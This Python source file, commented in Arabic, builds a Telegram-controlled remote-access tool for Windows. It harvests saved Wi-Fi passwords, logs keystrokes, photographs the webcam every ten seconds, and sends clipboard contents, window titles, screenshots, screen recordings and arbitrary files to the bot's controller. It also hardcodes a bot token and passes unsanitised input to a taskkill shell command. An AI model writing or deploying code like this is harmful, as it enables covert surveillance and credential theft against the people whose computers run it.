import telebot
from telebot import types
import pyautogui
import pyperclip
import os
import time
import requests
import subprocess
import win32gui
import threading
import webbrowser
import sys
import ctypes
import pyttsx3  # تحويل النص لكلام
import cv2      # مكتبة الفيديو والكاميرا
import numpy as np 
from pynput import keyboard 
from datetime import datetime

# ==========================================
# 1. إعدادات النظام والمسارات
# ==========================================
try:
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
except:
    pass

# التوكين (تم استخدام التوكين الأحدث من laptop_44)
TOKEN = "8500372242:AAFVPMzbH-cciXHkiCpXHH2AXaAMvZzrLa0"
MY_ID = None # سيتم تعيينه تلقائياً عند إرسال /start

bot = telebot.TeleBot(TOKEN)

# --- متغيرات التحكم ---
SCREENSHOT_INTERVAL = 60
current_path = os.getcwd()
clipboard_history = []
file_map = {} 
music_map = {}

# متغيرات المراقبة (فيديو & كيبورد)
is_recording_video = False
video_thread = None
key_listener = None
logged_keys = [] 
is_keylogging = False

# --- المسارات والمجلدات ---
DESKTOP_PATH = os.path.join(os.path.expanduser("~"), "Desktop")
SAVE_DIR = os.path.join(DESKTOP_PATH, "محمود_System_Ultimate") # مجلد الحفظ الجديد
MUSIC_DIR = r"D:\music\abo El Shouk" # مسار الموسيقى من كود 3

# المجلدات الفرعية
VIDEO_FOLDER = os.path.join(SAVE_DIR, "تسجيل_فيديو")
LOGS_FOLDER = os.path.join(SAVE_DIR, "سجلات_كيبورد")
CAM_FOLDER = os.path.join(SAVE_DIR, "صور_الكاميرا_التلقائية")

# إنشاء المجلدات
for folder in [SAVE_DIR, VIDEO_FOLDER, LOGS_FOLDER, CAM_FOLDER]:
    if not os.path.exists(folder):
        try: os.makedirs(folder)
        except: pass

# ==========================================
# 2. دوال مساعدة (System Logic)
# ==========================================
def is_authorized(user_id):
    return user_id == MY_ID

def speak_text(text):
    try:
        engine = pyttsx3.init()
        engine.say(text)
        engine.runAndWait()
    except Exception as e: print(e)

# --- دوال الشبكة (Wi-Fi) من كود 44 ---
def get_wifi_networks():
    try:
        data = subprocess.check_output('netsh wlan show networks', shell=True).decode('cp850', errors="ignore")
        return data
    except: return "❌ لا يمكن الوصول لكرت الشبكة"

def get_saved_wifi_passwords():
    try:
        data = subprocess.check_output('netsh wlan show profiles', shell=True).decode('cp850', errors="ignore")
        profiles = [i.split(":")[1][1:-1] for i in data.split('\n') if "All User Profile" in i]
        result_text = "🔐 **كشف كلمات المرور المحفوظة:**\n"
        for i in profiles:
            try:
                cmd = f'netsh wlan show profile name="{i}" key=clear'
                results = subprocess.check_output(cmd, shell=True).decode('cp850', errors="ignore")
                results = [b.split(":")[1][1:-1] for b in results.split('\n') if "Key Content" in b]
                try: result_text += f"📡 {i}: `{results[0]}`\n"
                except: result_text += f"📡 {i}: (Open/No Pass)\n"
            except: pass
        return result_text
    except: return "❌ خطأ في استخراج البيانات."

def connect_to_wifi(ssid, password):
    config = f"""<?xml version=\"1.0\"?>
<WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\">
    <name>{ssid}</name>
    <SSIDConfig><SSID><name>{ssid}</name></SSID></SSIDConfig>
    <connectionType>ESS</connectionType><connectionMode>auto</connectionMode>
    <MSM><security><authEncryption>
    <authentication>WPA2PSK</authentication><encryption>AES</encryption>
    <useOneX>false</useOneX></authEncryption>
    <sharedKey><keyType>passPhrase</keyType><protected>false</protected><keyMaterial>{password}</keyMaterial></sharedKey>
    </MSM></MSM>
</WLANProfile>"""
    try:
        filename = f"wifi_config.xml"
        with open(filename, "w") as file: file.write(config)
        subprocess.run(f'netsh wlan add profile filename="{filename}"', shell=True)
        subprocess.run(f'netsh wlan connect name="{ssid}"', shell=True)
        os.remove(filename)
        return True
    except: return False

# ==========================================
# 3. دوال المراقبة (الكاميرا، الكي لوجر، الفيديو)
# ==========================================

# 1. الكاميرا التلقائية (من كود 44)
def auto_camera_loop():
    """التقاط صورة ويب كام كل 10 ثواني"""
    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW) 
    if not cap.isOpened():
        print("⚠️ الكاميرا غير متوفرة، تم تعطيل المراقبة التلقائية للكاميرا.")
        return 
    
    while True:
        try:
            ret, frame = cap.read()
            if ret:
                timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
                filename = os.path.join(CAM_FOLDER, f"AutoCam_{timestamp}.jpg")
                cv2.imwrite(filename, frame)
                # إرسال للمالك
                if MY_ID:
                    try:
                        with open(filename, 'rb') as f:
                            bot.send_photo(MY_ID, f, caption=f"👁️ رصد كاميرا: {timestamp}")
                    except: pass
            time.sleep(10) # كل 10 ثواني
        except: time.sleep(5)

# 2. مراقبة سطح المكتب والحافظة (من كود 3)
def automatic_desktop_monitor():
    """مراقبة النوافذ المفتوحة والحافظة ولقطات الشاشة"""
    last_window = ""
    last_clipboard = ""
    last_screenshot_time = time.time()
    
    while True:
        try:
            timestamp = datetime.now().strftime("%H:%M:%S")
            # النوافذ
            try:
                window = win32gui.GetForegroundWindow()
                curr_window = win32gui.GetWindowText(window)
            except: curr_window = ""
            if curr_window and curr_window != last_window and MY_ID:
                bot.send_message(MY_ID, f"👀 **[نشاط]** {curr_window}")
                last_window = curr_window

            # الحافظة
            try:
                curr_clip = pyperclip.paste()
                if curr_clip and curr_clip != last_clipboard:
                    if MY_ID: bot.send_message(MY_ID, f"📋 **[نسخ]**\n{curr_clip}")
                    clipboard_history.append(f"[{timestamp}] {curr_clip}")
                    last_clipboard = curr_clip
            except: pass

            # لقطة شاشة تلقائية
            if time.time() - last_screenshot_time > SCREENSHOT_INTERVAL and MY_ID:
                try:
                    shot = "auto_screen.png"
                    pyautogui.screenshot(shot)
                    with open(shot, 'rb') as f: bot.send_photo(MY_ID, f, caption=f"🔄 شاشة: {timestamp}")
                    os.remove(shot)
                except: pass
                last_screenshot_time = time.time()

            time.sleep(1.5)
        except: time.sleep(5)

# 3. الكي لوجر (مشترك)
def on_key_press(key):
    global logged_keys
    try: logged_keys.append(key.char)
    except AttributeError: logged_keys.append(f" [{str(key).replace('Key.', '')}] ")

def start_keylogger_logic():
    global key_listener, is_keylogging, logged_keys
    logged_keys = [] 
    is_keylogging = True
    key_listener = keyboard.Listener(on_press=on_key_press)
    key_listener.start()

def stop_and_save_keylogs(chat_id):
    global key_listener, is_keylogging
    if key_listener: key_listener.stop()
    is_keylogging = False
    filename = os.path.join(LOGS_FOLDER, f"Keylog_{datetime.now().strftime('%H-%M-%S')}.txt")
    with open(filename, "w", encoding="utf-8") as f: f.write("".join(logged_keys))
    with open(filename, "rb") as f: bot.send_document(chat_id, f)

# 4. تسجيل الفيديو (مشترك)
def record_screen_logic(chat_id):
    global is_recording_video
    screen_size = pyautogui.size()
    video_path = os.path.join(VIDEO_FOLDER, f"Screen_{datetime.now().strftime('%H-%M-%S')}.avi")
    fourcc = cv2.VideoWriter_fourcc(*"XVID")
    out = cv2.VideoWriter(video_path, fourcc, 10.0, screen_size) 
    try:
        while is_recording_video:
            img = pyautogui.screenshot()
            frame = cv2.cvtColor(np.array(img), cv2.COLOR_BGR2RGB)
            out.write(frame)
        out.release()
        with open(video_path, 'rb') as v: bot.send_video(chat_id, v)
    except: pass
    if 'out' in locals(): out.release()

# ==========================================
# 4. لوحات التحكم (UI)
# ==========================================
def create_main_keyboard():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    # صف 1
    markup.add(types.KeyboardButton('🕵️ مراقبة وتسجيل'), types.KeyboardButton('📡 أدوات الشبكة'))
    # صف 2
    markup.add(types.KeyboardButton('✅ تأكيد التشغيل'), types.KeyboardButton('🔴 إغلاق الجهاز'))
    # صف 3
    markup.add(types.KeyboardButton('🖼️ تغيير الخلفية'), types.KeyboardButton('🗣️ نطق نص'))
    # صف 4
    markup.add(types.KeyboardButton('🔈 التحكم في الصوت'), types.KeyboardButton('🎵 تشغيل موسيقى'))
    # صف 5
    markup.add(types.KeyboardButton('📸 لقطة شاشة'), types.KeyboardButton('📂 مدير الملفات'))
    # صف 6
    markup.add(types.KeyboardButton('📩 إرسال رسالة'), types.KeyboardButton('🌐 فتح رابط'))
    # صف 7
    markup.add(types.KeyboardButton('📋 سجل الحافظة'), types.KeyboardButton('☠️ قتل برنامج'))
    return markup

def create_monitor_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(types.InlineKeyboardButton("📹 بدء فيديو", callback_data="vid_start"),
               types.InlineKeyboardButton("⏹ إيقاف فيديو", callback_data="vid_stop"))
    markup.add(types.InlineKeyboardButton("⌨️ بدء الكي-لوجر", callback_data="key_start"),
               types.InlineKeyboardButton("📝 إيقاف الكي-لوجر", callback_data="key_stop"))
    return markup

def create_network_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("📶 الشبكات المتاحة", callback_data="wifi_scan"))
    markup.add(types.InlineKeyboardButton("🔐 كلمات المرور المحفوظة", callback_data="wifi_pass"))
    markup.add(types.InlineKeyboardButton("🔗 اتصال بشبكة", callback_data="wifi_connect"))
    return markup

def get_file_keyboard(path):
    global file_map
    file_map = {} 
    markup = types.InlineKeyboardMarkup()
    try:
        items = os.listdir(path)
        folders = [f for f in items if os.path.isdir(os.path.join(path, f))]
        files = [f for f in items if os.path.isfile(os.path.join(path, f))]
        markup.add(types.InlineKeyboardButton("⬆️ ...رجوع للخلف", callback_data="CD_UP"))
        for i, folder in enumerate(folders[:8]): 
            file_key = f"DIR_{i}"
            file_map[file_key] = folder 
            markup.add(types.InlineKeyboardButton(f"📁 {folder}", callback_data=file_key))
        for i, file in enumerate(files[:8]):
            file_key = f"FILE_{i}"
            file_map[file_key] = file
            markup.add(types.InlineKeyboardButton(f"📄 {file}", callback_data=file_key))
    except: markup.add(types.InlineKeyboardButton("خطأ قراءة", callback_data="NONE"))
    return markup

# ==========================================
# 5. معالجة الأوامر (Handlers)
# ==========================================
@bot.message_handler(commands=['start'])
def start_command(message):
    global MY_ID
    if MY_ID is None:
        MY_ID = message.chat.id
        bot.reply_to(message, f"✅ **تم الاتصال بنجاح!**\nSystem Online.\nID: `{MY_ID}`", reply_markup=create_main_keyboard(), parse_mode="Markdown")
        # تشغيل ثريد الكاميرا التلقائية بمجرد اتصال المالك
        threading.Thread(target=auto_camera_loop, daemon=True).start()
    elif message.chat.id == MY_ID:
        bot.reply_to(message, "👋 أهلاً بك مجدداً.", reply_markup=create_main_keyboard())

# --- القوائم الرئيسية ---
@bot.message_handler(func=lambda m: m.text == '🕵️ مراقبة وتسجيل')
def open_monitor(m):
    if is_authorized(m.chat.id):
        bot.reply_to(m, "🛠 **أدوات التحكم:**", reply_markup=create_monitor_keyboard())

@bot.message_handler(func=lambda m: m.text == '📡 أدوات الشبكة')
def open_net(m):
    if is_authorized(m.chat.id):
        bot.reply_to(m, "📡 **أدوات الشبكة:**", reply_markup=create_network_keyboard())

@bot.message_handler(func=lambda m: m.text == '🔈 التحكم في الصوت')
def volume_control(message):
    if not is_authorized(message.chat.id): return
    markup = types.InlineKeyboardMarkup(row_width=3)
    markup.add(
        types.InlineKeyboardButton("🔊 رفع", callback_data="VOL_UP"),
        types.InlineKeyboardButton("🔉 خفض", callback_data="VOL_DOWN"),
        types.InlineKeyboardButton("🔇 كتم", callback_data="VOL_MUTE")
    )
    bot.reply_to(message, "🎚️ التحكم في الصوت:", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text == '📂 مدير الملفات')
def open_file_manager(message):
    if not is_authorized(message.chat.id): return
    global current_path
    if current_path == "": current_path = os.getcwd()
    bot.send_message(message.chat.id, f"📂 `{current_path}`", parse_mode="Markdown", reply_markup=get_file_keyboard(current_path))

@bot.message_handler(func=lambda m: m.text == '🎵 تشغيل موسيقى')
def music_menu(message):
    if not is_authorized(message.chat.id): return
    global music_map
    music_map = {}
    if not os.path.exists(MUSIC_DIR):
        bot.reply_to(message, f"❌ المجلد غير موجود:\n`{MUSIC_DIR}`")
        return
    try:
        files = [f for f in os.listdir(MUSIC_DIR) if f.lower().endswith(('.mp3', '.wav'))]
        if not files:
            bot.reply_to(message, "📂 المجلد فارغ.")
            return
        markup = types.InlineKeyboardMarkup(row_width=1)
        for i, file in enumerate(files):
            key = f"MUS_{i}"
            music_map[key] = file
            markup.add(types.InlineKeyboardButton(f"🎧 {file}", callback_data=key))
        bot.reply_to(message, f"🎶 **قائمة التشغيل:**", reply_markup=markup)
    except: bot.reply_to(message, "خطأ في قراءة الموسيقى.")

# --- Callbacks Handler (القلب النابض) ---
@bot.callback_query_handler(func=lambda call: True)
def handle_all_queries(call):
    if not is_authorized(call.message.chat.id): return
    chat_id = call.message.chat.id
    data = call.data
    global is_recording_video, current_path, is_keylogging

    # 1. الشبكة
    if data == "wifi_scan":
        bot.answer_callback_query(call.id, "بحث...")
        bot.send_message(chat_id, f"📶 الشبكات:\n{get_wifi_networks()}")
    elif data == "wifi_pass":
        bot.answer_callback_query(call.id, "جاري الاستخراج...")
        bot.send_message(chat_id, get_saved_wifi_passwords(), parse_mode="Markdown")
    elif data == "wifi_connect":
        msg = bot.send_message(chat_id, "📝 أرسل: `اسم_الشبكة,الباسورد`", parse_mode="Markdown")
        bot.register_next_step_handler(msg, process_wifi_connect)

    # 2. المراقبة (فيديو/كيبورد)
    elif data == "vid_start":
        if not is_recording_video:
            is_recording_video = True
            threading.Thread(target=record_screen_logic, args=(chat_id,)).start()
            bot.answer_callback_query(call.id, "بدأ الفيديو")
    elif data == "vid_stop":
        is_recording_video = False
        bot.answer_callback_query(call.id, "توقف الفيديو")
    elif data == "key_start":
        if not is_keylogging:
            start_keylogger_logic()
            bot.answer_callback_query(call.id, "بدأ الكي لوجر")
    elif data == "key_stop":
        stop_and_save_keylogs(chat_id)
        bot.answer_callback_query(call.id, "تم الحفظ")

    # 3. الصوت
    elif data == "VOL_UP":
        for _ in range(5): pyautogui.press('volumeup')
        bot.answer_callback_query(call.id, "🔊")
    elif data == "VOL_DOWN":
        for _ in range(5): pyautogui.press('volumedown')
        bot.answer_callback_query(call.id, "🔉")
    elif data == "VOL_MUTE":
        pyautogui.press('volumemute')
        bot.answer_callback_query(call.id, "🔇")

    # 4. الموسيقى
    elif data.startswith("MUS_"):
        if data in music_map:
            filename = music_map[data]
            full_path = os.path.join(MUSIC_DIR, filename)
            os.startfile(full_path)
            bot.answer_callback_query(call.id, f"تشغيل: {filename}")

    # 5. الملفات
    elif data == "CD_UP":
        current_path = os.path.dirname(current_path)
        bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
            text=f"📂 `{current_path}`", parse_mode="Markdown", reply_markup=get_file_keyboard(current_path))
    elif data in file_map:
        real_name = file_map[data]
        if data.startswith("DIR_"):
            current_path = os.path.join(current_path, real_name)
            bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
                text=f"📂 `{current_path}`", parse_mode="Markdown", reply_markup=get_file_keyboard(current_path))
        elif data.startswith("FILE_"):
            file_path = os.path.join(current_path, real_name)
            bot.answer_callback_query(call.id, "جاري الرفع...")
            with open(file_path, 'rb') as f: bot.send_document(chat_id, f)

def process_wifi_connect(message):
    try:
        ssid, password = message.text.split(',')
        if connect_to_wifi(ssid.strip(), password.strip()):
            bot.send_message(message.chat.id, "✅ تم طلب الاتصال.")
        else:
            bot.send_message(message.chat.id, "❌ فشل.")
    except: pass

# --- باقي الأوامر (نفسها من كود 3) ---
@bot.message_handler(func=lambda m: m.text == '🗣️ نطق نص')
def ask_tts(message):
    if not is_authorized(message.chat.id): return
    msg = bot.reply_to(message, "🗣️ اكتب الجملة:")
    bot.register_next_step_handler(msg, lambda m: threading.Thread(target=speak_text, args=(m.text,)).start())

@bot.message_handler(func=lambda m: m.text == '🖼️ تغيير الخلفية')
def ask_wallpaper(message):
    if not is_authorized(message.chat.id): return
    msg = bot.reply_to(message, "🖼️ أرسل الصورة:")
    bot.register_next_step_handler(msg, set_wallpaper_handler)

def set_wallpaper_handler(message):
    try:
        if message.content_type != 'photo': return
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        bg_path = os.path.join(SAVE_DIR, "wallpaper_set.jpg")
        with open(bg_path, 'wb') as new_file: new_file.write(downloaded_file)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, bg_path, 0)
        bot.reply_to(message, "✅ تم")
    except: pass

@bot.message_handler(func=lambda m: m.text == '📸 لقطة شاشة')
def screen(m):
    if is_authorized(m.chat.id):
        shot = "s.png"
        pyautogui.screenshot(shot)
        with open(shot, 'rb') as f: bot.send_photo(m.chat.id, f)
        os.remove(shot)

@bot.message_handler(func=lambda m: m.text == '📩 إرسال رسالة')
def ask_message_text(message):
    if not is_authorized(message.chat.id): return
    msg = bot.reply_to(message, "💬 الرسالة:")
    bot.register_next_step_handler(msg, lambda m: threading.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(0, m.text, "Admin Message", 0x40 | 0x1000)).start())

@bot.message_handler(func=lambda m: m.text == '🌐 فتح رابط')
def ask_link(message):
    if not is_authorized(message.chat.id): return
    msg = bot.reply_to(message, "🔗 الرابط:")
    bot.register_next_step_handler(msg, lambda m: webbrowser.open(m.text if m.text.startswith('http') else 'https://'+m.text))

@bot.message_handler(func=lambda m: m.text == '☠️ قتل برنامج')
def ask_kill(message):
    if not is_authorized(message.chat.id): return
    msg = bot.reply_to(message, "اسم البرنامج (chrome.exe):")
    bot.register_next_step_handler(msg, lambda m: os.system(f"taskkill /f /im {m.text}"))

@bot.message_handler(func=lambda m: m.text == '🔴 إغلاق الجهاز')
def shutdown_pc(message):
    if is_authorized(message.chat.id): os.system("shutdown /s /t 5")

@bot.message_handler(func=lambda m: m.text == '✅ تأكيد التشغيل')
def confirm_running(message):
    if is_authorized(message.chat.id): bot.reply_to(message, "✅ Online")

@bot.message_handler(func=lambda m: m.text == '📋 سجل الحافظة')
def history(m):
    if is_authorized(m.chat.id):
        bot.reply_to(m, "\n".join(clipboard_history[-10:]) if clipboard_history else "فارغ")

# ==========================================
# 6. التشغيل النهائي
# ==========================================
if __name__ == "__main__":
    # تشغيل مراقبة سطح المكتب (سكرين شوت + نوافذ)
    threading.Thread(target=automatic_desktop_monitor, daemon=True).start()
    
    print(f"🚀 MERGED SYSTEM STARTED...")
    print("👉 Send /start in Telegram.")
    
    while True:
        try: bot.infinity_polling(timeout=10, long_polling_timeout=5)
        except Exception as e: 
            print(f"Polling Error: {e}")
            time.sleep(5)